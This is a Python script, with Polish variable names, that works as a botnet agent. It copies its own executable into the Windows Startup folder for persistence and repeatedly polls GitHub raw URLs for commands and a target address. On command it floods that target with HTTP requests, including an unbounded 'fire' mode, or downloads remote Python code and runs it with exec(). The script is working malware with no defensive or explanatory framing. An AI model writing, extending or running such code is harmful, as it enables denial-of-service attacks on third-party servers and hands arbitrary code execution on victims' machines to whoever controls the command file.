import requests
import time
import os
import sys
import shutil

def kill_switch():
    path = os.path.join(os.path.expanduser("~"), "stop")
    return os.path.exists(path)

def add_to_startup():
    startup_folder = os.path.join(
        os.environ["APPDATA"],
        r"Microsoft\Windows\Start Menu\Programs\Startup"
    )

    exe_path = sys.executable

    target = os.path.join(startup_folder, "eee_windows.exe")

    if os.path.exists(target) and os.path.samefile(exe_path, target):
        return

    shutil.copy(exe_path, target)

add_to_startup()

def sprawdz_dzialanie():
    try:
        time.sleep(5)
        response = requests.get("https://raw.githubusercontent.com/haziel12-Leszord/repo/refs/heads/main/tryt/procedura", timeout=5)
        global response2
        otrzymana_odp = response.text
        if otrzymana_odp.strip() == "0":
            time.sleep(10)
            print('0')
        elif otrzymana_odp.strip() == "1":
            for _ in range(10):
                time.sleep(0.5)
                requests.get(response2)
        elif otrzymana_odp.strip() == "2":
            for _ in range(20):
                time.sleep(0.1)
                requests.get(response2)
        elif otrzymana_odp.strip() == "3":
            for _ in range(450):
                time.sleep(0.1)
                requests.get(response2)
        elif otrzymana_odp.strip() == "fire":
            while True:
                for i in range(500):
                    requests.get(response2)
                otrzymana_odp_zmienna = requests.get("https://raw.githubusercontent.com/haziel12-Leszord/repo/refs/heads/main/tryt/procedura", timeout=10).text.strip()
                if otrzymana_odp_zmienna != "fire":
                    break
        elif otrzymana_odp.strip() == "f1":
            otrz = requests.get("https://raw.githubusercontent.com/haziel12-Leszord/repo/refs/heads/main/tryt/command").text.strip()
            exec(otrz)
            time.sleep(60)

        else:
            print('0')
            time.sleep(10)
    except Exception as e:
        print(e)

while True:
    if kill_switch():
        print("kill_switch")
        break
    try:
        response2 = requests.get("https://raw.githubusercontent.com/haziel12-Leszord/repo/refs/heads/main/tryt/serverurl").text.strip()
        sprawdz_dzialanie()
    except ConnectionError:
        print(0)